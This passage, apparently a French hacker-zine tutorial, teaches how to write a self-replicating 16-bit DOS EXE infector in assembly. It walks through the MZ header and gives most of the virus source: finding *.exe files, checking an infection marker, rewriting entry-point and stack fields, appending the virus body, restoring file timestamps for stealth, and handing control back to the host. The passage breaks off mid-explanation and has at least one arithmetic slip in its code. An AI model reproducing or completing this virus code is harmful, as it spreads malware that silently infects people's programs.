@@ -1,0 +1,991 @@
+-----------------------------------------------------------------------------------------------
+                                Infecteur d'exe 16 bits:                               rikenar
+-----------------------------------------------------------------------------------------------
+
+
+
+                                      [Sommaire]:    
+
+
+
+
+
+ 1/ Introduction
+ 
+ 2/ Programmation
+          A/ Mode de fonctionnement du virus
+          B/ Caractéristiques des fichiers 16 bits (l'header et autres)
+          C/ Programmation étapes par étapes
+ 
+ 3/ Code source
+
+ 4/ Conclusion:
+
+
+
+
+                   -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  - 
+
+
+
+
+[1/ Introduction:]
+
+Voici donc le premier article d'une série, je l'espère où nous allons voir le fonctionnement et
+la programmation d'infecteur de fichiers exécutables fonctionnant sous environnement win32 ou 
+dos. Dans cette première partie, nous allons nous intéresser plus particulièrement au fichier 
+16 bits. Notre but étant de créer un exécutable qui pourra se reproduire dans tous les fichiers
+présent dans le répertoire. Si vous souhaitez vous renseigner un peu plus sur ce sujet, je peux
+vous conseiller quelques articles qui sont assez intéressant, qui se trouve dans le zine de 
+Tipiax, dans rtc et dans le mag de ioc. Je vous conseille aussi les 2 guides de Billy Belcebu
+en anglais qui sont indispensables si vous souhaitez vous mettre assez sérieusement aux 
+infecteur.
+Pour ce qui est du langage utilisé, on va bien sûr coder en 100% asm, je vous recommende donc
+de vous procurer un table de toutes les interruptions, il faut aussi que vous ayez un minimum 
+de base dans ce langage pour pouvoir suivre correctement. Aussi dans ce premier article, je ne 
+parlerai que des fichiers exe 16 bits qui fonctionnent sous dos, ce sujet ne traitera en aucun
+cas des exécutables qui appartiennent à un environnement win32. Nous pouvons commencer.
+
+
+
+
+[ 2/ Programmation:]
+
+A/ Mode de fonctionnement du virus
+
+Avant de commencer, je vais expliquer ce que devra faire le programme que nous allons coder. Un 
+infecteur, généralement doit essayer de se copier son code à la fin de tous les fichiers (pour 
+nous ce sera ceux du répertoire) sans que l' utilisateur lambda ne s'en apercoive, mais aussi 
+sans que le programme hôte ne soit altéré. Donc après, l'infection tous les programmes doivent 
+fonctionner comme auparavant mais avec un petit changement qui est d' executer le code du virus
+en 1er avant de redonner la main au programme hôte. Je vais faire un exemple tout simple pour 
+mieux comprendre:
+-nous avons 2 programmes: infecteur.exe et prog1.exe qui fonctionnent normalement tous les 2.
+-lorsque j'execute infecteur.exe, celui se greffe à la fin de prog1.exe sans que l'on s'en 
+aprecoivent.
+-prog1.exe est désormais infecté.
+-je rajoute prog2.exe dans le meme répertoire.
+-il y a donc 3 fichiers maintenant: (I) -> veut dire infecté 
+      * infecteur.exe(I)
+      * prog1.exe(I)
+      * prog2.exe 
+Le fichier que nous avons rajouté est donc sain.
+-en éxécutant, prog1.exe, celui ci doit donc lire le code que nous lui avons greffer, c'est à 
+dire celui de infecteur.exe et doit donc infecter prog2.exe
+-à la fin, nos 3 fichiers sont infectés sans que l'on s'en soit aperçu.
+
+Et c'est là, que je veux préciser quelquechose à ceux qui lisent ces lignes, c'est à dire à 
+ceux qui débutent dans le monde des virus, il faut que vous compreniez que l' interet du virus
+n'est pas celui que la plupart des gens pensent, c'est à dire de détruire les données et de
+crasher l' ordinateur, il ne faut pas croire tout ce qu'on entend et tout ce que disent ces 
+compagnies d' antivirus qui ne cherchent comme toujours qu' à se faire de l' argent. Le but 
+d'un virus est d'essayer de se reproduire le plus possible dans les fichiers qui lui sont 
+offert, donc si vous avez lu ces lignes dans l' espoir de trouver un moyen de planter l'
+ordinateur de qqun pour je ne sais quels raisons, vous pouvez vite arrêter de lire.
+
+
+Nous voilà donc reparti, le but de notre programme va être:
+- d'aller s' écrire à la fin d'un fichier.
+- de modifier certains champs du fichier pour permettre au code du virus d'être éxécuté en 1er 
+lorsque l'on lancera le programme infecté.
+- et de redonner la main au fichier hôte pour que cela paraisse le plus transparant possible.
+Bien sûr, cette algorithme est simplifié au maximum mais le principe est là.
+
+
+
+ B/ Caractéristiques des fichiers 16 bits (l'header et autres):
+
+Dans chaque fichiers exe 16 bits, on peut aprecevoir au début de ceux ci une en-tête(ou header) 
+qui est nécessaire au bon fonctionnement du fichier. Pour que notre virus fonctionne 
+correctement, il va falloir que vous compreniez bien les différents champs de l' header, en 
+effet l' ajout de notre virus à la fin de celui ci va modifier certains champs de cette en-tête.
+Voyons voir maintenant, un descriptif de cette header:
+
+
+---------------------------------------------------------------------------------------------
+|   Offset |             Nom             |               Description                        |
++-------------------------------------------------------------------------------------------+
+|-> 00h    |        Exe mask             |   Champs qui ns dit si l'on est ds un exe = MZ   |
+|-------------------------------------------------------------------------------------------+
+|-> 02h (b)|  Taille de la dernière page |      Taille de la dernière pages en bytes        |
+|-------------------------------------------------------------------------------------------+
+|-> 04h (P)|     Nb total de pages       |Nb total de pages(= 512 bytes)qu'occupe le fichier|  
+|-------------------------------------------------------------------------------------------+
+|   06h    |       Relocations           |    Nb d' entrées dans la table de relocation     |                                              
+|-------------------------------------------------------------------------------------------+
+|-> 08h (p)|   Taille de l'header        |  Taille de l'en tête en paragraphe(= 16 bytes).  |              
+|-------------------------------------------------------------------------------------------+
+|   0ah (p)|     Allocation mini         |    Mémoire minimum requise (en paragraphes)      |                                           
+|-------------------------------------------------------------------------------------------+
+|   0ch (p)|     Allocation maxi         |    Mémoire maximum requise (en paragraphes)      |                                   
+|-------------------------------------------------------------------------------------------+
+|-> 0eh (p)|     Prerelocation SS        |     Offset initial de SS depuis l' header        |                                                 
+|-------------------------------------------------------------------------------------------+
+|-> 10h (b)|   Stack pointer initial     |          Offset initial de SP depuis SS          |                                             
+|-------------------------------------------------------------------------------------------+
+|-> 12h    |        Checksum             |  Intéressant pour placer la marque d' infection  |                                                 
+|-------------------------------------------------------------------------------------------+
+|-> 14h (b)|        Ip initial           |              1er Ip à exécuter                   |                                              
+|-------------------------------------------------------------------------------------------+
+|-> 16h (p)|        Cs initial           |           Cs initial du programme                |                                    
+|-------------------------------------------------------------------------------------------+
+|   18h    |  Adresse table relocation   |Offset de la table de relocation depuis le fichier|                                         
+|-------------------------------------------------------------------------------------------+
+|   1ah    |       Overlay number        |                 Rien d' intéressant              |                       
+|-------------------------------------------------------------------------------------------+
+|   1ch    |          Reserve            |                                                  |
+|-------------------------------------------------------------------------------------------+
+
+Les champs intéressants sont marqués d'un '->'. Aussi pour mieux comprendre, dans la colonne 
+offset:
+-(b) signifie que les données sont exprimées en bytes.
+-(p) signifie que les données sont en paragraphes: 1 paragraphes = 16 bytes.
+-(P) signifie que les données sont exprimées en pages: 1 pages = 512 bytes.
+
+Il faut que vous compreniez cette en-tête pour ensuite bien connaitre le fonctionnement du virus,
+en effet là on joue plus avec les com, ici l'ajout du virus va devoir nous faire modifier qq 
+données de l'en-tête pour que le fichier sain puisse refonctionner correctement une fois infecté.
+Je vais expliquer plus en détails désormais les champs que j'ai marqués comme étant important, 
+car ceux là vont être modifié par l'ajout du virus à la fin du fichier, vous verrez que si vous 
+avez quelques bases en assembleur, vous comprendrez assez facilement:
+
+-Exe mask (offset 00) -> c'est ici que l'on va pouvoir tester si le fichier que l'on veut 
+infecter est bien un exe. Si c'en est un, on trouve à cette offset de l' header le marquage:MZ, 
+cela nous servira lorque l'infecteur voudra vérifier le fichier à infecter.
+
+-Taille de la dernière page (offset 02) et Nb total de pages  (offset 04) -> il faut savoir que 
+avec les exe 16 bits, leur taille peut etre donné par les champs 02 et 04 de l'header. A l'offset
+04, on trouve le nombre total de pages(qui est égal à 512 bytes) que le fichier posséde, et 
+l'offset 02 la taille en bytes de la dernière page. Je vais faire un exemple pour vous expliquer,
+ce sera plus facile: 
+Metons qu'on est un fichier qui fait 600 bytes, alors on aura à l'offset 04 le nb de pages de 
+512 bytes, c'est à dire 2 pour ce cas là. Et à l'offset 02, on aura la taille en bytes de la
+dernière page, c'est à dire 88. Si l'on veut retrouver la taille du fichier, on a qu'à faire:
+(2 - 1) * 512 + 88 = 600 bytes.
+Voilà pour ce qui est de ces adresses.
+
+-Taille de l'header (offset 08) -> Ce champs calculé en paragraphes désigne la taille que 
+répresente l' en-tête du fichier, on ne modifiera rien à cette adresse mais cela nous servira 
+lorsqu'on voudra faire pointer la première instruction du programme (après infection) sur le 
+code du virus.
+
+-Prerelocation SS (offset 0e) -> Ici, on trouve le déplacement qu'il faut effectuer à partir de 
+la fin de l'header pour atteindre la stack segment (SS), cette valeur est aussi calculé en 
+paragraphes.
+
+-Stack pointer initial (offset 10) -> On trouve ici, encore le déplacement relatif qu'il y a du
+ stack segment au stack pointer. Nous modifierons ce champs est pour éviter que le données et le 
+code viennent écraser la pile, il faut choisir à cette endroit une valeur assez grande.
+
+-Checksum -> Ce champs n'a pas une utilité primordiale, et nous servira à marquer notre 
+signature suite à l'infection, ce qui nous permettra de ne pas infecter un fichier qui l'est 
+déja.
+
+-Ip initial (offset 14) et Cs initial (offset 16) -> ces deux champs sont très important car il
+contiennent à eux 2, la première instruction qui va être éxécuté par le programme qui sera de la 
+forme  Cs(initial) : Ip(initial) et qui bien entendu devra pointer sur notre virus. Pour être 
+plus précis, les valeurs sont calculé à partir de la fin de l'header du programme.
+
+Voilà pour ce qui est de principaux champs de l'header qui sont utiles pour que l'infection
+soit réussi. Si vous n'avez pas tout compris (parce que c'est mal expliqué :)), ne vous en 
+faites pas, ce sera reexpliqué lors du moment où on parlera un peu plus programmation et vous 
+verrez que dès que vous aurait bien compris le fonctionnement de l'header, le code sera très 
+facile à comprendre.
+
+
+
+
+C/ Programmation étapes par étapes:
+
+1. Déroulement de l'infection:
+
+Bon, ca y est, on va commencer à parler un peu plus pratique et on va pouvoir passer au côté 
+programmation. Mais avant, on va détailler toutes les étapes qu'il va falloir pour que l'
+infecteur fonctionne parfaitement. Et c'est là que vous devait tout bien comprendre, en effet 
+si vous avez compris parfaitement le processus d'infection de notre virus, et que vous avez de 
+bonnes bases en asm, le code deviendra alors assez facile. Parce que je peux vous dire que si 
+moi, j'y suis arrivé, tout le monde le peut si il se donne la peine de réfléchir.
+Passons à l'algorithme de notre programme maintenant.
+
+1. On calcule en premier le delta offset qui est le décalage que le virus à provoqué après s'
+être écrit dans le fichier.
+2. Tout d'abord, on ouvre le fichier à l'aide de la table Dta et on ouvre que les fichiers qui 
+portent l'extension *.exe.
+3. On sauvegarde l'heure de dernière modification du fichier hôte.
+4. On vérifie qu'il s'agit bien d'un fichier exe par l'intermédiaire du premier champs de l'
+header du fichier (MZ).
+5. On teste si le fichier à déjà était infecté à l'aide de la signature que nous aurions écrits
+à l'offset 12 de l'header.
+6. On garde en mémoire les champs les plus importants de l'header qui vont nous servir, c'est 
+à dire les champs aux offsets 0eh, 10h, 14h et 16h.
+7. On se place à la fin du fichier.
+8. On calcule les nouveaux champs de l'header et plus particulièrement ceux aux offsets 14 et 
+16 qui devront bien naturellement pointé sur le premiére instruction de notre virus qui a été 
+copié dans le fichier. 
+9. On recalcule la nouvelle taille du fichier après infection et on place les nouvelles valeurs
+aux adresses 02 et 04 de l'header du fichier.
+10. On écrit le virus à la fin du fichier.
+11. On se place au début et on écrit la nouvelle en-tête.
+12. On restaure la dernière date de modification que l'avait sauvegarder plus haut.
+13. Et enfin on rend la main au fichier hôte sans que l'utilisateur ne s'aprecoivent de 
+quelquechose.
+
+
+Je vais détailler chaque étapes le plus possible en essayant de ne pas omettre de détails.
+
+
+
+2. Programmation:
+
+On va commencer par ce qui est caractéristiques de tous les virus qu'ils fonctionnent sous dos 
+ou sous windows, je parle donc ici du delta offset. On pourrait le définir comme étant le 
+décalage que le virus à crée en allant s'écrire à la fin du fichier. Et voilà le code 
+illustrant cette partie:
+
+-----------------------------
+
+debut:
+
+call delta             <-l'offset de delta est pushé sur la pile
+
+delta:
+pop bp                 <-pop bp permet de récupérer dans bp, ip qui a été pushé à cause du call
+sub bp, offset delta   <-on enleve à bp, l'offset de delta qui a été trouvé lors de la  
+                          compilation     
+
+
+-----------------------------
+
+
+
+Voyons voir un exemple, vous verrez que cela deviendra beaucoup plus facile aprés, ici le 1er 
+cas représente le virus lui même et le 2ème nous montre un fichier après infection. 
+
+
+               Virus                               Fichier infecté
+
+
+111C:0106   call 0109   -> ip = 109.        112D:0200   call 0203   -> ip = 0203.
+111C:0109   pop bp      -> bp = 109.        112D:0203   pop bp      -> bp = 0203. 
+111C:010A   sub bp, 109 -> bp = 0.          112D:0204   sub bp, 109 -> bp = 203h - 109h = FA.
+
+On voit donc assez bien que dans le virus, bp c'est à dire le delta offset est nul ce qui est 
+normal vu que le virus est l'infecteur d'origine. En revanche dans le fichier infecté, le delta
+offset est 'FA', qui est donc le décalage qui nous servira tant par la suite et qui représente
+le déplacement par rapport au fichier. Ce mécanisme du delta offset existe dans tous les virus
+je crois.
+
+
+Ensuite, après avoir calculer le delta offset, nous allons devoir restaurer l'ancien Ip placé 
+dans ip_old pour le mettre dans ip_new, on effectue cela par l'aide movsw qui copie la chaine 
+qui est dans si (source index) dans di (destination index)
+
+
+-----------------------------
+
+ip:
+lea di, [ip_new + bp]
+lea si, [ip_old + bp]
+        movsw
+        movsw
+        movsw
+        movsw
+
+-----------------------------
+
+
+Maintenant, il faut définir une nouvelle adresse de la table dta qui va nous permettre de 
+pouvoir lister tous les fichiers du répertoire avant de les infecter, pour cela on utilise la 
+fonction 1ah de l'interruption 21h. Il faut savoir que dans la table Dta, il y a beaucoup de 
+paramètres qui sont très utiles pour l'infection d'un fichier. Parmi les principaux champs, on 
+trouve à l'offset 1eh le nom du fichier. Donc pour modifier l'adresse de la nouvelle dta, il 
+faut:
+
+-----------------------------
+
+mtda:
+mov ah, 1ah                     
+lea dx, [bp + offset new_dta]
+int 21h
+
+mov ah, 4eh
+lea dx, [bp + exe_mask]         ; exe_mask -> *.exe
+sub cx, cx                      ; cx = 0.
+search:
+int 21h
+jc end
+
+-----------------------------
+
+On va ainsi modifier l'adresse de la nouvelle Dta avec ce qui se trouve à l'adresse de new_dta.
+Après, on va lire avec la fonction 4eh la première entrée du répertoire qui aura un nom de 
+fichier de type: *.exe, c'est à dire on va lire tous les fichiers exe. On appelle l'
+interruption et si il y a un problème, on se casse.
+Seulement, ensuite on va pouvoir ouvrir le fichier, on pourra donc effectuer des changements
+dessus. Pour cela rien de difficile, voici la syntaxe de la fonction que l'on va utiliser:
+
+Fonction 3d:
+Permet d'ouvrir un fichier existant.
+
+ah -> 3dh
+al -> on place ici le mode d'accés
+      ici 02 permet au fichier d' être lu et écrit.
+dx -> offset du nom du fichier à ouvrir.
+Et en retour de l'execution de la fonction, on choppe en ax l'handle du fichier qui nous 
+servira pour tout le reste du code, lorsqu'on voudra effectuer des opérations sur un fichier.
+
+Ce qui donne: 
+
+-----------------------------
+
+mov ah, 3dh
+mov al, 02h
+lea dx, [bp+new_dta+1eh]          ; à l'offset 1eh de la table dta, on a le nom du fichier
+int 21h
+
+mov bx, ax
+mov ax, 5700h          ; on lit la date de dernière modification du fichier
+int 21h
+push cx                ; on sauvegarde pour faire plus discret
+push dx 
+
+-----------------------------
+
+Voilà, jusque ici rien de bien compliqué. Mais maintenant, nous allons attaquer à l'header du 
+fichier, à la sauvegarde de celui ci, mais aussi à la modification. Pour cela nous allons, 
+nous allons lire les premiers 1ah octets de l'header à l'aide la fonction 3fh. Nous allons 
+aussi vérifier que nous avons bien sous les mains un fichier exe en comparant le premier 
+champs de l'entête à 'ZM', on vérifie aussi que la fichier n'a pas déja été infecté, et ceci 
+grâce à la signature que l'on aura écrite à l'offset 12h de l'header.
+
+Fonction 3f:
+Cette fonction permet de lire un nombre défini de caractères dans un fichier que l'on vient 
+d'ouvrir.
+
+ax -> 3fh
+bx -> handle du fichier
+cx -> nombre d'octets à lire
+dx -> offset du buffer où l'on va placer les caractères lus.
+
+Et voici le code.
+
+-----------------------------
+
+mov ah, 3fh
+mov cx, 1ah                          ; lit les 1ah premiers caractères de l'header
+lea dx, [bp + offset buffer_header]  ; les place dans buffer_header
+int 21h        
+
+
+cmp word ptr [bp+buffer_header], 'ZM'     ; compare le premier champs avec 'ZM' pour voir si  
+jne close                                 ; on est dans le bon fichier. Sinon on se casse. 
+
+cmp word ptr [bp+buffer_header + 12], 'T' ; vérifie si le fichier est déjà infecté
+je close                                  ; sinon on se barre 
+
+-----------------------------
+
+
+Voilà, maintenant, on va pouvoir commencé l'infection du fichier. En premier, il va falloir 
+sauvegarder les principaux champs de l'en-tête pour pouvoir les manipuler par la suite, on 
+fera ceci avec le call save_header. En deuxième, on va modifier les offsets 0eh, 10h, 12h, 
+14h et 16h. Et en dernier, on va recalculer la taille du fichier. Ces 3 étapes étant selon 
+les plus difficiles à comprendre, je les expliquerai plus tard. 
+Entre cela, vous remarquerez que l'on a dépalcé le pointeur de fichier à la fin de celui ci.
+
+
+-----------------------------
+
+call save_header                         ; on sauvegarde l'header d'origine
+
+mov ah, 42h                              ; fonction 42h -> déplace le pointeur de fichier
+mov al, 02h                              ; al = 02h -> on le déplace à la fin 
+xor cx, cx
+xor dx, dx
+int 21h
+
+call new_csip                            ; on change certains champs de l'header
+call new_size                            ; et on calcule la nouvelle taille après infection
+
+-----------------------------
+
+
+Donc, après avoir fait tout ceci, et ayant calculer les nouveaux champs de l'header, nous 
+allons devoir bien entendu écrire le virus. Notez que l'on écrira celui ci à la fin du fichier 
+et cela en premier. Et en deuxième, on va réecrire la nouvelle en-têtes que l'on viendra de 
+calculer. Voici le descriptif des fonctions utilisés:
+
+Fonction 40h
+Cette fonction écrit un nombre de caractères dans le fichier que l'on aura spécifier à l'
+endroit où sera placé le pointeur du fichier.
+
+ah -> 40h
+bx -> handle du fichier
+cx -> nombre d'octets à écrire dans le fichier
+dx -> à partir de quel adresse on écrit.
+
+-----------------------------
+
+mov ah, 40h                     
+pop bx                             ; handle du fichier
+mov cx, fin - debut                ; taille du fichier
+lea dx, [bp + debut]               ; on écrit à partir de debut
+int 21h
+
+mov ah, 42h                  
+mov al, 00h                        ; on se place au début du fichier pour écrire la   
+xor cx, cx                         ; nouvelle header
+xor dx, dx
+int 21h
+
+mov ah, 40h                        ; on écrit 
+mov cx, 1ah                        ; les 1ah octets de l'entete que l'on vient de calculer
+lea dx, [bp + buffer_header]       ; et qui stocké à partir de l'adresse de buffer_header
+int 21h
+
+close:
+pop bx                             ; on pop le bx pushé avant
+
+close2:
+
+pop dx                             ; on pop la date et l'heure de la dernière modification
+pop cx                             ; du fichier que l'on avait sauvegardé au début 
+mov ax, 5701h                      ; et on définit la date
+int 21h
+
+mov ah, 3eh
+int 21h                            ; on ferme le fichier qui est désormais infecté  
+
+mov ah, 4fh                        ; et on lit la prochaine entrée du répertoire
+jmp  search                        ; on recommence la nouvelle recherche
+
+
+-----------------------------
+
+Voilà, après toutes ces étapes nous avons tous les fichiers de notre répertoire  qui sont 
+désormais infecté. Mais pour rester le plus discret possible au yeux de l'utilisateur, le 
+virus doit redonner la main au fichier hôte comme si rien ne s'était passé. Pour cela, il va 
+falloir effectué un saut à la première instruction du fichier hôte, ainsi ce fichier pourra 
+après avoir exécuté le code du virus exécuté le sien, et tout fonctionnera comme si aucun 
+fichier n'vait été infecté. Et ce passage est assez difficile à comprendre, c'est pour ça que 
+j'essairai de bien le détailler.
+
+Tout d'abord, nous avons que tout à l'heure nous avons modifié l'adresse la dta, or 
+normalement l'adresse de la table dta est déjà initilialisé, c'est pour cela que nous allons 
+la restaurer, ainsi l'adresse de la dta ne sera pas modifié. Voici les quelques lignes de code:
+
+-----------------------------
+
+end:
+pop  ds                          ; on pop ce que l'on avait pushé au tout début du programme
+mov  dx,80                       ; nouvelle adresse d'offset de la table dta
+mov  ah,1a                       ; et on définit la nouvelle adresse
+int  21
+
+-----------------------------
+
+Bon, maintenant attaquons une chose assez difficile à comprendre. Je parle bien sûr du moment 
+où nous allons rendre la main au programme hôte. Cette étape est extrêmement importante, sans 
+cela tous les programmes infectés planterait; le virus ne serait donc pas très discret. 
+Ce qui faut comprendre, ce que avec cette procédure, nous allons créer un jmp qui va pointait
+sur la première instruction du programme hôte avant infection. 
+Mais avant tout cela, je vais d'abord un peu expliqué comment est organisé la mémoire pour les 
+fichiers exe 16 bits. Il faut savoir que lorsque un fichier exe est chargé en mémoire, il est 
+ajouté à sa base un petite structure que l'on appelle Psp (program segment prefix), et que 
+cette structure a une taille de 256 octets, on en déduit donc que le Psp va se trouver dans la 
+mémoire à cs-10h (car 10h*10h=256) si on admet que cs pointe au début de notre code .De plus 
+les segments ds et es pointent tout deux sur Psp. 
+Voici un shéma qui devrait un peu mieux vous expliqué:
+
+
+                              Structure d'un fichier en mémoire
+
+
+
+                                    +----------------+            
+                                    |      Stack     |
+                                    |                |
+                                    +----------------+
+                                    |     Données    |
+                                    |                |
+                                    +----------------+
+                                    |      Code      |
+                                    |                |
+                                    +----------------+  ->  cs:0000
+                                    |       PSP      |
+                                    |                |
+                                    +----------------+  ->  cs-10h:0000
+
+Regardond le code de cette partie:
+
+
+-----------------------------
+
+push    ds                                  
+pop     es                                  ; ds = es
+mov     ax,es                               ; ax = es = ds , ax pointe sur le psp
+add     ax,10                               ; ax = ax + 10 , maintenant ax pointe sur cs
+add     word ptr cs:[cs_new+bp],ax          ; on ajoute le décalage relatif à partir de l'header
+                                      
+cli
+add     ax,word ptr cs:[bp+ss_new]           
+mov     ss,ax                               ; on ajoute es + 10 à ss
+mov     sp,word ptr cs:[bp+sp_new]
+sti
+
+db      0ea                                 ; jmp far vers le début du prog
+ip_new        dw      0                     ; ce qui donne jmp cs:ip avec cs:ip qui pointent 
+cs_new        dw      0                     ; sur notre code
+sp_new        dw      0
+ss_new        dw      0
+
+
+ip_old  dw      0
+cs_old  dw      0fff0           
+sp_old  dw      0              
+ss_old  dw      0fff0         
+
+-----------------------------
+
+Petite explication, nous savons que es pointe sur le psp, donc es+10 pointe sur cs; or nous 
+savons que cs_new représente le décalage relatif de la fin de l"header par rapport à l'entry 
+point donc pour avoir la vrai adresse du programme en mémoire, il nous faut ajouter l'adresse 
+du code du programme en mémoire. De cette façon, nous pouvons désormais effectuer un saut vers 
+le Entry point de notre programme avant infection. Si vous ne comprenez pas tout ce que je dit,
+je vous conseille de tracer le code de l'infecteur pas à pas avec softice et d'analyser l'
+évoltion des différents registres, ca vous aidera beaucoup. Voilà, on a donc bien rendu la main
+au programme hôte.
+
+
+
+Regardons désormais, les différentes fonctions que je n'ai pas encore expliqué et qui sont très
+importantes car elles permettent chacune de pouvoir modifier convenablement l'header du fichier pour que le fichier qui sera infecté ne soit pas corrompus et puisse fonctionne comme 
+avant. Tout d'abord nous allons voir le call save_header qui ne fait rien de bien compliqué, en effet
+il se contente de sauvegarder les principaux champs de l'header qui sont les champs 0eh, 10h, 
+14h et 16h chacun contenant respectivement l'offset initial de Ss depuis la fin de l'header, 
+l'offset initial de Sp depuis Ss, l' Ip initial et enfin le Cs initial. Le champs 14h et 16h 
+permettent donc de connaitre la première instruction qui sera exécuté lorsque l'on lancera 
+l'executable.
+
+-----------------------------
+
+save_header:
+mov  ax,word ptr [bp+buffer_header+0Eh]      ; sauvegarde ce qui se trouve à l'offset 0eh de 
+mov  word ptr [bp+ss_old],ax                 ; de l'header dans ss_old.
+mov  ax,word ptr [bp+buffer_header+10]       ; sauvegarde ce qui se trouve à l'offset 10h de 
+mov  word ptr [bp+sp_old],ax                 ; de l'header dans sp_old.
+mov  ax,word ptr [bp+buffer_header+14]       ; sauvegarde ce qui se trouve à l'offset 14h de 
+mov  word ptr [bp+ip_old],ax                 ; de l'header dans ip_old.
+mov  ax,word ptr [bp+buffer_header+16]       ; sauvegarde ce qui se trouve à l'offset 16h de 
+mov  word ptr [bp+cs_old],ax                 ; de l'header dans cs_old.
+ret
+
+-----------------------------
+
+Il n'y a donc rien de compliqué de coté là, en revanche maintenant, nous allons attaquer une 
+partie moins facile. Ici, on va modifier les champs de l'entête qui doivent être modifié 
+pour que le fichier fonctionne. Dans ce call, nous allons modifié 5 champs, je vais commencé 
+par vous expliquer les moins compliqué.
+Tout d'abord, il va falloir que lorsque on infecte un fichier, on ne le réinfecte pas 2 fois, 
+pour cela on va mettre un signature dans l'header qui va nous permettre de vérifier si le 
+fichier est déjà infecté ou pas. Pour cela, nous allons utilisé un champs de l'header qui est 
+inutilisé, c'est à dire celui qui se trouve à l'offset 12h. Voici donc la ligne de code qui 
+fait ceci:
+ 
+mov     word ptr [bp+buffer_header+12h], 'T'.
+
+Nous savons aussi que à l'offset 10h de l'header se trouve le déplacement qu'il y a à partir 
+de Ss pour atteindre Sp. On va donc mettre à cette adresse un valeur suffisemment grande qui 
+nous assurerait que la pile ne débordera jamais sur le code (ce qui serai pas très bon), moi 
+je mettrai la valeur 0fffeh mais sachez que vous pouvez à cette emplacement une autre valeur 
+(mais qui devra être suffisemment grande). Cela se fait avec:
+
+mov     word ptr [bp+buffer_header+10h],0FFFE.
+
+Voilà, nous avons fini avec 2 champs, il nous reste les autres à modifier. En plus ce sont eux 
+les plus important car les offsets 14h et 16h sont capitals pour le bon fonctionnement du virus.
+En effet, nous voulons que quand le virus a infecté un fichier, ce soit le code du virus qui 
+soit executer en premier et non le code du programme qui était exécuté en premier avant l'
+infection. Cette partie est donc très importante.
+Tout d'abord, nous savons que les champs 14h et 16h de l'entete calcule le décalage à partir de
+la fin de l'header, il va donc falloir connaitre la taille de celle-ci. Nous avons de la 
+chance, cette taille est donnée à l'offset 08h de l'header mais elle est donnée en paragraphes,
+il va donc falloir convertir en bytes ( 1 paragraphe = 16 bytes), il va donc falloir 
+multiplier la taille de l'header en paragraphes par 16 par l'avoir en bytes. 16 étant un 
+multiple de 2, on pourra utiliser l'instruction shl. Nous avons donc désormais la taille de 
+l'header en bytes.
+
+Juste avant d'appeler ce call, nous avons à l'aide de la fonction 42h de l'interruption 21h 
+déplacer le pointeur de fichier vers la fin de celui ci. Or en retour de cette fonction, nous 
+avons en dx et en ax, la taille du fichier où dx représente le mot de poids fort et en ax le 
+mot de poids faible. Par exmple si le fichier fait 70000 bytes de taille, on aura dans dx : 1 
+et dans ax : 1170. Il va donc falloir que l'on s'occupe bien à la fois de ax et dx pour que il 
+n'y est pas de problème. On va alors soustraire la taille de l'header à la taille du fichier 
+avant infection; sachant que l'infecteur irra se greffer à la fin du fichier, on aura alors le 
+déplacement qu'il y a de la fin de l'header au début de l'infecteur.
+De plus, nous savons que la mémoire est organisé de telle manière que chaque adresse peut être 
+représenté de la façon segment:offset et que on peut avoir la vrai adresse de quelquechose en 
+faisant : segment * 16 + offset. Un vrai adresse peut donc être représenté de différentes 
+façons. Revenons en à notre infecteur, sachant que l'on doit ranger à l'offset 16h le Cs 
+initial du programme et à l'offset 14h le Ip initial, et tous deux étant calculés à partir de 
+la fin de l'header. On en déduit que en divisant par 16 (10 en hexa) le déplacement qu'il y a 
+de la fin de l'header au début de l'infecteur, on aura alors en ax le nouveau Cs et en dx le 
+nouveau Ip. Aussi il faut savoir que les champs qui se trouvent à l'offset 0eh (Ss) et à 
+l'offset 16h (Cs) doivent avoir la même valeur. Et voici le code:
+ 
+-----------------------------
+
+new_csip:
+
+
+mov     bx, word ptr [bp+buffer_header+8]          ; taille de l'header en paragraphes
+mov     cl, 0004h                                  
+shl     bx, cl                                     ; bx = taille de l'header en bytes
+sub     ax, bx                                     ; ax = ax - taille de l'header
+sbb     dx, 0000h                                  ; soustraction avec retenue
+mov     cx, 0010h                                  ; on divise par 10h (16 en décimal)
+div     cx             
+mov     word ptr [bp+buffer_header+0Eh], ax        ; nouveau Ss
+mov     word ptr [bp+buffer_header+14h], dx        ; nouveau Ip
+mov     word ptr [bp+buffer_header+12h], 'T'       ; signature
+mov     word ptr [bp+buffer_header+16h], ax        ; nouveau Cs
+mov     word ptr [bp+buffer_header+10h],0FFFE      
+ret
+
+-----------------------------
+
+C'est fini pour cette partie de la programmation du virus. On est presque à la fin, il ne nous 
+reste plus que le calcul des champs 02h et 04h de l'entête, ce qui n'est pas une partie 
+insurmontable.
+Nous avons vu déjà au début comment fonctionnait ces 2 champs, je vais refaire un exemple pour 
+que vous compreniez bien. Metons un fichier qui 1200 bytes, alors on aura à l'offset 2 de l'
+header la taille de la dernière page, c'est à dire 176 et à l'offset 4, on aura le nombre de 
+pages, ici on a 3.
+
+    1ere        2eme    3eme
+***********|***********|****
+ 512 bytes   512 bytes   176 bytes
+
+Voilà, ce shéma resume un peu ce qui se passe. Vous aurez peut etre compris comment on va faire
+pour recalculer le champs. En fait, on va s'aider bien entendu de la taille de notre virus que
+l'on pourra calculer à l'aide du label de début et du label de fin, pour nous ca donnerra:
+mov ax, fin - debut, ce qui mettra dans ax la taille de notre virus. Tout va commencé à partir 
+de là, ensuite on divise ax par 512 (200 en hexadécimal), on aura donc à la suite de cette 
+division en ax le nombre de page à ajouter à l'offset 4 de l'header et en dx le reste de la 
+division à ajouter à l'offset 2 de l'entete. Or nous savons que à l'offset 2 de l'header se 
+trouve la taille en bytes de la dernière page, donc il faut que ce nombre soit inférieur à la 
+taille d'un page, c'est à dire 512 bytes,si c'est le cas, on a fini. En revanche si ce nombre 
+est supérieur, il va falloir tout d'abord incréménter le nombre de pages que l'on trouve à l'
+offset 4 et en dernier truc il va falloir calculer le modulo[512] par rapport à ceux que on a 
+en à l'offset 2 de l'header. Je vais faire avant un petit rappel sur les modulo et sur comment 
+les calculer en assembleur.
+Je vais vous mettre un exemple, je pense que ca suffira à comprendre:
+600 modulo 512 est égale à 88.
+1300 modulo 512 est égale à 276.
+En fait, le modulo permet de calculer le reste de la division par 512 (dans ce cas).
+En assembleur, pour les puissances de 2, le modulo d'un nombre peut se cacluler par l'
+instruction and en choisissant comme deuxième opérande, le nombre qui est directement inférieur
+à 512 pour nous c'est à dire 511. Donc, nous on aura qu'à faire un petit:
+and  word ptr [bp+buffer_header+02],512d.
+Je vais encore faire un exemple en utilisant un and pour trouver le modulo:
